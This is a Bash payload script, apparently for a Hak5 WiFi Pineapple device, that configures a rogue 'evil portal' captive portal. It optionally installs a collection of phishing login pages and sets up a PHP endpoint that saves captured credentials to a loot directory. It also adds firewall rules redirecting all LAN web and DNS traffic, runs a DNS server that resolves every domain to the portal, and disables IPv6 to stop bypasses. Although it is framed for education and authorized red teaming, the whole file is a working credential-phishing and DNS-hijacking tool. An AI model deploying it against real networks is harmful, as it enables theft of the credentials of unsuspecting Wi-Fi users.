#!/bin/bash
# Title: goodportal Configure
# Description: Configure and start captive portal on lan interfaces
# Purpose: Display educational captive portal page with no additional configuration
# Author: spencershepard (GRIMM)
# Version: 1.3

# IMPORTANT!  As of Pager Firware 1.0.4 the opkg source list is broken with a missing repository.  
# To fix, comment out or remove the offending line (Hak5) in /etc/opkg/distfeeds.conf before installing packages.

# EDUCATIONAL USE
# For educational purposes, this payload provides a simple captive portal setup
# with no additional configuration required. It is intended for demonstration
# and learning scenarios only with authorized consent.

# RED TEAM USE
# For authorized red team engagements, save captive portal directories to /www/goodportal/{portal_name}
# EvilPortals from https://github.com/kleo/evilportals work out of the box with this setup
# You will be prompted to select which portal to use if multiple directories are present
# Credentials are automatically saved to /root/loot/goodportal/credentials_YYYY-MM-DD_HH-MM-SS.log by whitelist_monitor
# Once credentials are captured, clients are whitelisted and bypass the firewall (ie to access the internet)
# ALERT on capturing new client credentials

# Design constitution: 
#   - all configurations changes must be reversible with reboot and/or goodportal_remove payload
#   - simple is best
#   - allow the user to easily add/remove their own portals with php support
#   - auto-install missing packages with user confirmation
#   - maximize compatibility with portal collections

# Dependencies:
#   - nginx (installed if missing)
#   - php8-fpm (optional, installed if PHP files are detected in portal directory)

# Changelog (update in README as well!):
#   1.1 - Initial release
#   1.2 - Added additional http firewall redirect rule
#       - Fixed 'opkg update &&' chaining issue
#       - Fixed Name -> Title metadata
#       - Added warning about internet blocking on LAN (necessary for captive portal functionality)
#       - Added installation option for pre-built Evil Portals collection (github.com/kleo/evilportals)
#       - Redirect page after credential capture now waits for internet access instead of fixed delay (with fake progress bar)
#       - Whitelist now uses IP addresses instead of MAC addresses
#    1.3 - Fixed captive portal auto-detection race condition on WiFi Pineapple Pager
#	- Improved Android captive portal reliability (prevents ERR_SSL_PROTOCOL_ERROR)
#	- Restart GoodPortal DNS hijack safely without affecting system dnsmasq
#	- Replaced deprecated ALERT_RINGTONE with ALERT in whitelist monitor
# Todo:
#   - add portal directory name to credentials log for easier identification
#   - improve time delay after whitelisting and before client can access internet (currently 60+ seconds as of v1.2)

BRIDGE_MASTER="br-lan"
PORTAL_IP="172.16.52.1"
PORTAL_ROOT="/www/goodportal"
PAYLOAD_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Warn user about internet blocking
resp=$(CONFIRMATION_DIALOG "WARNING: This payload will block internet access to clients on the LAN! Clients will NOT have internet access until credentials are entered (like a real captive portal). Internet blocking persists until 'goodportal Remove' payload is executed. Continue?")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "[INFO] User cancelled. Exiting."
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "[INFO] Aborting. No changes made."
    exit 0
fi

# Check if nginx is installed
if ! command -v nginx >/dev/null 2>&1; then
    LOG yellow "[WARNING] nginx is not installed."
    resp=$(CONFIRMATION_DIALOG "REQUIRED: Install nginx now? This may take several minutes.")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "[ERROR] Dialog rejected or error occurred"
            exit 1
            ;;
    esac
    
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "Updating package lists..."
        opkg update
        LOG "Installing nginx..."
        opkg install nginx
        if ! command -v nginx >/dev/null 2>&1; then
            LOG "[ERROR] nginx installation failed. Please install manually."
            exit 1
        fi
        LOG "nginx installed successfully"
    else
        LOG "[INFO] Aborting. Please install nginx with: opkg update && opkg install nginx"
        exit 1
    fi
fi

mkdir -p $PORTAL_ROOT/default

# Enumerate subdirectories in $PORTAL_ROOT
DIRS=("default")
LOG "Scanning for portal directories in $PORTAL_ROOT..."
for d in "$PORTAL_ROOT"/*/; do
    [ -e "$d" ] || continue  # Skip if glob didn't match anything
    dname=$(basename "$d")
    if [ -d "$d" ] && [ "$dname" != "default" ] && [ "$dname" != "captiveportal" ]; then
        DIRS+=("$dname")
    fi
done

# Offer to install Evil Portals if only default exists
if [ "${#DIRS[@]}" -eq 1 ]; then
    LOG "Only default portal found"
    resp=$(CONFIRMATION_DIALOG "OPTION: Install Evil Portals collection? This will install git (if needed) and clone pre-built portals from: github.com/kleo/evilportals")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "  User declined Evil Portals installation"
            ;;
        *)
            if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
                LOG "Installing Evil Portals..."

                LOG "Updating package lists..."
                opkg update
                
                # Install git and required packages
                GIT_PACKAGES="git git-http ca-certificates ca-bundle"
                for pkg in $GIT_PACKAGES; do
                    if ! opkg list-installed | grep -q "^${pkg} "; then
                        LOG "    Installing $pkg..."
                        opkg install "$pkg"
                        if ! opkg list-installed | grep -q "^${pkg} "; then
                            LOG red "    [ERROR] Failed to install $pkg"
                        else
                            LOG green "    Installed $pkg"
                        fi
                    else
                        LOG "    $pkg already installed"
                    fi
                done
                
                if ! command -v git >/dev/null 2>&1; then
                    LOG red "  [ERROR] git installation failed"
                    ERROR_DIALOG "git installation failed! Cannot clone Evil Portals."
                else
                    LOG green "  git installed successfully"
                fi

                
                # Clone Evil Portals repo to temp directory
                if command -v git >/dev/null 2>&1; then
                    CLONE_DIR="/tmp/evilportals-clone-$$"
                    LOG "  Cloning repository to $CLONE_DIR..."
                    
                    if git clone https://github.com/kleo/evilportals.git "$CLONE_DIR" 2>&1 | while read line; do LOG "    $line"; done; then
                        # Checkout specific commit
                        cd "$CLONE_DIR"

                        # Checkout known good commit
                        git checkout 0fc1f052c5cff2befe84860cfb86befd1390962e 2>/dev/null  
                        cd - >/dev/null
                        
                        # Copy portals directory
                        if [ -d "$CLONE_DIR/portals" ]; then
                            LOG "  Copying portals to $PORTAL_ROOT..."
                            cp -r "$CLONE_DIR/portals/"* "$PORTAL_ROOT/" 2>/dev/null
                            
                            # Count how many were copied
                            PORTAL_COUNT=$(find "$PORTAL_ROOT" -mindepth 1 -maxdepth 1 -type d ! -name "default" ! -name "captiveportal" | wc -l)
                            LOG green "  SUCCESS: Installed $PORTAL_COUNT Evil Portals"
                            
                            # Clean up
                            rm -rf "$CLONE_DIR"
                            
                            # Rescan directories
                            DIRS=("default")
                            for d in "$PORTAL_ROOT"/*/; do
                                [ -e "$d" ] || continue
                                dname=$(basename "$d")
                                if [ -d "$d" ] && [ "$dname" != "default" ] && [ "$dname" != "captiveportal" ]; then
                                    DIRS+=("$dname")
                                fi
                            done
                        else
                            LOG red "  [ERROR] portals directory not found in clone"
                            rm -rf "$CLONE_DIR"
                            ERROR_DIALOG "portals directory not found in cloned repository!"
                        fi
                    else
                        LOG red "  [ERROR] git clone failed"
                        rm -rf "$CLONE_DIR"
                    fi
                fi
            fi
            ;;
    esac
fi

# Prompt user to select directory if more than one exists
SELECTED_DIR="default"
if [ "${#DIRS[@]}" -gt 1 ]; then
    # Format directory list for display
    dirPrompt=""
    for i in "${!DIRS[@]}"; do
        dirPrompt="$dirPrompt$((i+1)) ${DIRS[$i]}\n"
    done
    PROMPT "Portal directories:\n\n$dirPrompt"
    PICK=$(NUMBER_PICKER "Select portal directory" "1")
    if [[ "$PICK" =~ ^[0-9]+$ ]] && [ "$PICK" -ge 1 ] && [ "$PICK" -le "${#DIRS[@]}" ]; then
        SELECTED_DIR="${DIRS[$((PICK-1))]}"
    fi
fi
LOG "Serving portal from: $SELECTED_DIR"

# Only create default portal files if 'default' is selected
if [ "$SELECTED_DIR" = "default" ]; then
    # Copy default portal HTML from payload directory
    if [ -f "$PAYLOAD_DIR/default_portal.html" ]; then
        cp "$PAYLOAD_DIR/default_portal.html" $PORTAL_ROOT/default/index.html
        chmod 644 $PORTAL_ROOT/default/index.html
        LOG "  Installed default portal page"
    else
        LOG red "  [ERROR]: default_portal.html not found in payload directory"
        exit 1
    fi
fi

# Function to configure PHP for captive portal use
configure_php() {
    LOG "  Configuring PHP for captive portal..."
    
    # Disable doc_root restriction (causes "No input file specified")
    if grep -q '^doc_root = "/www"' /etc/php.ini 2>/dev/null; then
        sed -i 's/^doc_root = "\/www"/doc_root =/' /etc/php.ini
        LOG "  Disabled doc_root restriction in php.ini"
    fi
    
    # Disable cgi.force_redirect (also causes "No input file specified")
    mkdir -p /etc/php8
    cat > /etc/php8/99-custom.ini << 'PHPINI'
cgi.force_redirect = 0
cgi.fix_pathinfo = 1
PHPINI
    LOG "  Created /etc/php8/99-custom.ini"
    
    # Restart PHP-FPM to apply configuration changes
    LOG "  Restarting PHP-FPM to apply changes..."
    /etc/init.d/php8-fpm restart 2>/dev/null || /etc/init.d/php-fpm restart 2>/dev/null || true
    sleep 1
}

# Check for PHP files in portal directory
PHP_REQUIRED=0
LOG "Checking for PHP files in: $PORTAL_ROOT/$SELECTED_DIR"
PHP_FILES=$(find "$PORTAL_ROOT/$SELECTED_DIR" -name "*.php" 2>&1 | head -1)
LOG "Find result: '$PHP_FILES'"
if [ -n "$PHP_FILES" ]; then
    LOG "PHP files detected in portal directory"
    PHP_REQUIRED=1
    
    # Check if php8-fpm is installed
    if ! which php-fpm >/dev/null 2>&1 && ! ls /usr/bin/php-fpm* >/dev/null 2>&1 && ! opkg list-installed | grep -q php8-fpm; then
        LOG yellow "[WARNING] php-fpm is not installed. PHP files will not work."
        resp=$(CONFIRMATION_DIALOG "REQUIRED: Install PHP (php8 + php8-fpm) now? This may take several minutes.")
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                LOG "[INFO] Dialog rejected or error. Skipping PHP installation."
                PHP_REQUIRED=0
                ;;
            *)
                if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
                    LOG "Updating package lists..."
                    opkg update
                    LOG "Installing PHP packages..."
                    opkg install php8 php8-fpm php8-cgi
                    if ! opkg list-installed | grep -q php8-fpm; then
                        LOG red "[ERROR] PHP installation failed. PHP files will not work."
                        exit 1
                    else
                        LOG green "[Success] PHP installed"
                    fi
                else
                    LOG red "[ERROR] PHP installation declined. PHP files will not work."
                    exit 1
                fi
                ;;
        esac
    else
        LOG "PHP-FPM already installed"
    fi

    configure_php
fi


LOG "Configuring nginx goodportal instance..."

# Check if current nginx config is non-goodportal production config
if [ -f /etc/nginx/nginx.conf ]; then
    # Check if current config is from goodportal (contains our marker paths)
    if ! grep -q "$PORTAL_ROOT" /etc/nginx/nginx.conf 2>/dev/null; then
        # Not a goodportal config - might be another portal or custom setup
        # Check if nginx is actively serving on port 80
        if netstat -plant 2>/dev/null | grep -q ':80.*nginx'; then
            LOG "[WARNING] nginx is currently running with non-goodportal configuration"
            
            resp=$(CONFIRMATION_DIALOG "Overwrite current nginx configuration? This will replace your existing nginx setup with goodportal. A backup will be saved to nginx.conf.goodportal.bak")
            case $? in
                $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                    LOG "[INFO] User cancelled. Exiting without changes."
                    exit 0
                    ;;
            esac
            
            if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
                LOG "[INFO] Aborting. No changes made to nginx."
                exit 0
            fi
            LOG "  User confirmed overwrite"
        fi
    else
        LOG "  Detected existing goodportal configuration, proceeding with update"
    fi
fi

# Disable UCI nginx to prevent conflicts
LOG "Disabling UCI nginx..."
uci set nginx.global.uci_enable=false 2>/dev/null || true
uci commit nginx 2>/dev/null || true

# Backup original nginx config only if backup doesn't exist
if [ ! -f /etc/nginx/nginx.conf.goodportal.bak ]; then
    cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.goodportal.bak 2>/dev/null || true
    LOG "  Created backup of nginx config"
else
    LOG "  Nginx backup already exists, preserving original"
fi

# Detect PHP-FPM socket location if needed
if [ "$PHP_REQUIRED" -eq 1 ]; then
    if [ -S /var/run/php8-fpm.sock ]; then
        FPM_SOCK="/var/run/php8-fpm.sock"
    elif [ -S /var/run/php-fpm/php-fpm.sock ]; then
        FPM_SOCK="/var/run/php-fpm/php-fpm.sock"
    elif [ -S /var/run/php-fpm.sock ]; then
        FPM_SOCK="/var/run/php-fpm.sock"
    else
        FPM_SOCK="/var/run/php8-fpm.sock"
        LOG "  Warning: PHP-FPM socket not found, using default: $FPM_SOCK"
    fi
    
    # Setup credential capture handler
    LOG "  Setting up credential capture endpoint..."
    mkdir -p $PORTAL_ROOT/captiveportal
    
    # Copy credential capture stub from payload directory
    if [ -f "$PAYLOAD_DIR/captiveportal.php" ]; then
        cp "$PAYLOAD_DIR/captiveportal.php" $PORTAL_ROOT/captiveportal/index.php
        chmod 644 $PORTAL_ROOT/captiveportal/index.php
        LOG "  Installed credential capture handler"
    else
        LOG red "  [ERROR]: captiveportal.php not found in payload directory"
        exit 1
    fi
fi

# Create complete nginx.conf with heredoc
LOG "  Creating nginx.conf..."
cat > /etc/nginx/nginx.conf << 'NGINXEOF'
user root root;
worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type text/html;
    sendfile on;
    keepalive_timeout 65;

    server {
        listen 80 default_server;
        server_name _;
NGINXEOF

# Add root directive
echo "        root $PORTAL_ROOT/$SELECTED_DIR;" >> /etc/nginx/nginx.conf

# Add index directive
if [ "$PHP_REQUIRED" -eq 1 ]; then
    echo "        index index.php index.html;" >> /etc/nginx/nginx.conf
    LOG "  Set index: index.php index.html"
else
    echo "        index index.html;" >> /etc/nginx/nginx.conf
    LOG "  Set index: index.html"
fi

# Add captive portal detection endpoints
cat >> /etc/nginx/nginx.conf << 'NGINXEOF'

        # Captive portal detection endpoints - redirect to portal root
        # Android/iOS/Windows check these URLs; returning non-standard response triggers portal
        location = /generate_204 { return 302 http://$host/; }
        location = /gen_204 { return 302 http://$host/; }
        location = /connecttest.txt { return 302 http://$host/; }
        location = /success.txt { return 302 http://$host/; }
        location = /hotspot-detect.html { return 302 http://$host/; }
        location = /canonical.html { return 302 http://$host/; }
        location = /library/test/success.html { return 302 http://$host/; }
NGINXEOF

# Add PHP-FPM location block if needed
if [ "$PHP_REQUIRED" -eq 1 ]; then
    cat >> /etc/nginx/nginx.conf << NGINXEOF

        # Credential capture endpoint - shared handler for all portals
        location /captiveportal/ {
            alias $PORTAL_ROOT/captiveportal/;
            index index.php;
            location ~ \.php\$ {
                fastcgi_pass unix:$FPM_SOCK;
                fastcgi_index index.php;
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME \$request_filename;
            }
        }

        location ~ \.php\$ {
            fastcgi_pass unix:$FPM_SOCK;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        }
NGINXEOF
    LOG "  Enabled PHP-FPM support (socket: $FPM_SOCK)"
fi

# Add main location block
cat >> /etc/nginx/nginx.conf << 'NGINXEOF'

        location / {
            try_files $uri $uri/ =404;
        }
NGINXEOF

# Add error_page directive with named location for 404 handling
if [ "$PHP_REQUIRED" -eq 1 ]; then
    cat >> /etc/nginx/nginx.conf << 'NGINXEOF'
        
        error_page 404 = @fallback;
        
        location @fallback {
            rewrite ^ /index.php last;
        }
NGINXEOF
    LOG "  Added error_page 404 handler with @fallback location"
else
    cat >> /etc/nginx/nginx.conf << 'NGINXEOF'
        
        error_page 404 = @fallback;
        
        location @fallback {
            rewrite ^ /index.html last;
        }
NGINXEOF
    LOG "  Added error_page 404 handler with @fallback location"
fi

# Close server and http blocks
cat >> /etc/nginx/nginx.conf << 'NGINXEOF'
    }
}
NGINXEOF

LOG "  Created nginx.conf"

# Fix permissions on portal directory for nginx
LOG "Setting permissions on portal directory..."
# Ensure parent directory is accessible
chmod 755 "$PORTAL_ROOT" 2>/dev/null || true
# Make selected directory and all subdirectories readable/executable
find "$PORTAL_ROOT/$SELECTED_DIR" -type d -exec chmod 755 {} \; 2>/dev/null || true
# Make all files readable
find "$PORTAL_ROOT/$SELECTED_DIR" -type f -exec chmod 644 {} \; 2>/dev/null || true
LOG "  Permissions set (755 for dirs, 644 for files)"

# Start PHP-FPM if needed
if [ "$PHP_REQUIRED" -eq 1 ]; then
    LOG "Starting PHP-FPM..."
    /etc/init.d/php8-fpm start 2>/dev/null || /etc/init.d/php-fpm start 2>/dev/null || true
    sleep 1
    
    # Verify socket exists
    if ls /var/run/php*fpm*.sock >/dev/null 2>&1; then
        SOCK=$(ls /var/run/php*fpm*.sock | head -1)
        LOG "  PHP-FPM socket found: $SOCK"
    else
        LOG yellow "  [WARNING]: PHP-FPM socket not found!"
    fi
fi

# Stop nginx first to ensure clean start
LOG "Stopping nginx..."
/etc/init.d/nginx stop 2>/dev/null || true
killall nginx 2>/dev/null || true
sleep 1

# Validate nginx configuration before starting
LOG "Validating nginx configuration..."
if ! nginx -t 2>&1 | grep -q "test is successful"; then
    LOG red "[ERROR] nginx configuration test failed!"
    nginx -t 2>&1 | while read line; do LOG "  $line"; done
    
    # Restore backup if validation fails
    if [ -f /etc/nginx/nginx.conf.goodportal.bak ]; then
        LOG "  Restoring backup configuration..."
        mv /etc/nginx/nginx.conf.goodportal.bak /etc/nginx/nginx.conf
    fi
    
    ERROR_DIALOG "nginx configuration invalid! Check logs for details."
    exit 1
fi
LOG "  nginx configuration is valid"

# Start nginx (the init script will use the correct config)
LOG "Starting nginx with init script..."
/etc/init.d/nginx start
sleep 2


LOG "Configuring firewall NAT rules..."

# Redirect HTTP traffic
if ! uci show firewall | grep -q "name='GoodPortal HTTP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='GoodPortal HTTP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='80'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added HTTP redirect rule"
else
    LOG "  HTTP redirect rule already exists"
fi

# Redirect HTTPS to HTTP (captive portal on port 80)
if ! uci show firewall | grep -q "name='GoodPortal HTTPS lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='GoodPortal HTTPS lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='443'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='80'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added HTTPS->HTTP redirect rule"
else
    LOG "  HTTPS redirect rule already exists"
fi

# Redirect DNS TCP traffic (lan only)
if ! uci show firewall | grep -q "name='GoodPortal DNS TCP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='GoodPortal DNS TCP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].proto='tcp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='1053'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added DNS TCP redirect rule"
else
    LOG "  DNS TCP redirect rule already exists"
fi

# Redirect DNS UDP traffic (lan only)
if ! uci show firewall | grep -q "name='GoodPortal DNS UDP lan'"; then
    uci add firewall redirect
    uci set firewall.@redirect[-1].name='GoodPortal DNS UDP lan'
    uci set firewall.@redirect[-1].src='lan'
    uci set firewall.@redirect[-1].proto='udp'
    uci set firewall.@redirect[-1].src_dport='53'
    uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
    uci set firewall.@redirect[-1].dest_port='1053'
    uci set firewall.@redirect[-1].target='DNAT'
    uci set firewall.@redirect[-1].enabled='1'
    LOG "  Added DNS UDP redirect rule"
else
    LOG "  DNS UDP redirect rule already exists"
fi

uci commit firewall

/etc/init.d/firewall restart



LOG "Starting DNS hijacking..."

# Kill any existing goodportal dnsmasq process
if [ -f /tmp/goodportal-dns.pid ]; then
    OLD_PID=$(cat /tmp/goodportal-dns.pid)
    if kill -0 $OLD_PID 2>/dev/null; then
        kill $OLD_PID 2>/dev/null
        LOG "  Stopped existing DNS hijacking process (PID: $OLD_PID)"
    fi
fi

# Also kill any dnsmasq on port 1053 (fallback)
kill $(netstat -plant 2>/dev/null | grep ':1053' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null

# Start rogue DNS server
dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} --dns-forward-max=1 --cache-size=0 -p 1053 --listen-address=0.0.0.0,::1 --bind-interfaces &
DNS_PID=$!
echo "$DNS_PID" > /tmp/goodportal-dns.pid

LOG green "SUCCESS: DNS hijacking active (PID: $DNS_PID)"

LOG "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
LOG green "SUCCESS: IP forwarding enabled"

LOG "Disabling IPv6 on br-lan..."
# Android may bypass our IPv4-only captive portal rules
# Disable IPv6 temporarily to force all traffic through IPv4 hijacking
sysctl -w net.ipv6.conf.br-lan.disable_ipv6=1 2>/dev/null || LOG "  IPv6 already disabled or not available"
LOG green "SUCCESS: IPv6 disabled on br-lan"

LOG "Starting whitelist monitor..."
# Copy whitelist monitor script from payload directory
if [ -f "$PAYLOAD_DIR/whitelist_monitor.sh" ]; then
    cp "$PAYLOAD_DIR/whitelist_monitor.sh" /tmp/goodportal_whitelist_monitor.sh
    chmod +x /tmp/goodportal_whitelist_monitor.sh
    LOG "  Installed whitelist monitor script"
else
    LOG red "  [ERROR]: whitelist_monitor.sh not found in payload directory"
    exit 1
fi

# Kill any existing monitor
if [ -f /tmp/goodportal-whitelist.pid ]; then
    OLD_PID=$(cat /tmp/goodportal-whitelist.pid)
    if kill -0 $OLD_PID 2>/dev/null; then
        kill $OLD_PID 2>/dev/null
        LOG "  Stopped existing whitelist monitor (PID: $OLD_PID)"
    fi
fi

# Start monitor in background
/tmp/goodportal_whitelist_monitor.sh &
MONITOR_PID=$!
echo "$MONITOR_PID" > /tmp/goodportal-whitelist.pid
LOG green "SUCCESS: Whitelist monitor active (PID: $MONITOR_PID)"

LOG "Verifying portal..."

# Test root path
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:80/)
if [ "$HTTP_CODE" = "200" ]; then
    LOG green "SUCCESS: Portal root responding on port 80! (HTTP $HTTP_CODE)"
elif [ "$HTTP_CODE" = "403" ]; then
    LOG red "ERROR: Portal returned 403 Forbidden - checking permissions..."
    ls -la "$PORTAL_ROOT/$SELECTED_DIR" 2>&1 | head -5 | while read line; do LOG "  $line"; done
    nginx -T 2>&1 | grep -A 20 "server {" | head -25 | while read line; do LOG "  $line"; done
    exit 1
else
    LOG yellow "[WARNING]: Portal root returned HTTP $HTTP_CODE (expected 200)"
fi

# Test non-existent page to verify @fallback location works
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:80/nonexistent-page-test-12345)
if [ "$HTTP_CODE" = "200" ]; then
    LOG green "SUCCESS: 404 fallback working (redirects to index, HTTP $HTTP_CODE)"
elif [ "$HTTP_CODE" = "404" ]; then
    LOG yellow "[WARNING]: 404 not redirecting to index (HTTP $HTTP_CODE)"
else
    LOG yellow "[WARNING]: Non-existent page returned HTTP $HTTP_CODE"
fi

# Verify PHP-FPM if needed
if [ "$PHP_REQUIRED" -eq 1 ]; then
    if netstat -plant 2>/dev/null | grep -q 'php.*fpm' || ls -la /var/run/php*fpm.sock >/dev/null 2>&1; then
        LOG green "SUCCESS: PHP-FPM is running"
    else
        LOG red "ERROR: PHP-FPM does not appear to be running"
        exit 1
    fi
fi

# Verify DNS hijacking
LOG "Verifying DNS hijacking..."
if ! netstat -plant 2>/dev/null | grep -q ':1053'; then
    LOG red "ERROR: DNS hijack not listening on port 1053"
    exit 1
fi

# Test actual DNS resolution (ignore stderr, REFUSED error is expected with --no-resolv)
TEST_RESULT=$(nslookup -port=1053 google.com 127.0.0.1 2>&1 | grep "^Address:" | grep -v "127.0.0.1" | awk '{print $2}')
if [ "$TEST_RESULT" = "$PORTAL_IP" ]; then
    LOG green "SUCCESS: DNS hijacking active and resolving to portal IP"
else
    LOG yellow "[WARNING]: DNS test returned '$TEST_RESULT' (expected: $PORTAL_IP)"
fi

# Verify firewall rules 
RULE_COUNT=$(uci show firewall | grep -c "GoodPortal.*lan")
if [ "$RULE_COUNT" -eq 4 ]; then
    LOG green "SUCCESS: All 4 firewall rules configured!"
else
    LOG red "ERROR: Expected 4 firewall rules, found $RULE_COUNT"
    exit 1
fi


LOG "================================="
LOG "goodportal Configured Successfully!"
LOG "================================="
LOG ""
LOG "Testing:"
LOG "  1. Connect client device to Open AP or Evil WPA"
LOG "  2. Observe wifi sign-in prompt in prompt on client device"
LOG "  3. Verify captive portal page loads in browser"
LOG ""
LOG "Credentials saved to: /root/loot/goodportal/credentials_YYYY-MM-DD_HH-MM-SS.log"
LOG ""
LOG yellow "NOTES:  Firewall rules will persist across reboot."
LOG yellow " Run goodportal Remove payload for clean state"
LOG yellow "'Connection refused' errors may be due to client DNS caching https."
LOG " Run goodportal Configure again to restart after reboot or change portals. "
LOG " Run goodportal Clear Whitelist to reset client whitelist." 
LOG purple "Installed packages will persist, so running goodportal Configure again will be much faster after initial setup!"


LOG "Forcing captive portal re-detection..."

sleep 2

# Reset TCP state without breaking DNS
/etc/init.d/firewall restart

# Restart GoodPortal DNS hijack ONLY (do NOT touch system dnsmasq)
if [ -f /tmp/goodportal-dns.pid ]; then
    kill "$(cat /tmp/goodportal-dns.pid)" 2>/dev/null
fi

dnsmasq --no-hosts --no-resolv \
    --address=/#/${PORTAL_IP} \
    --dns-forward-max=1 \
    --cache-size=0 \
    -p 1053 \
    --listen-address=0.0.0.0,::1 \
    --bind-interfaces &

echo $! > /tmp/goodportal-dns.pid

LOG green "SUCCESS: Captive portal re-detection triggered"


exit 0
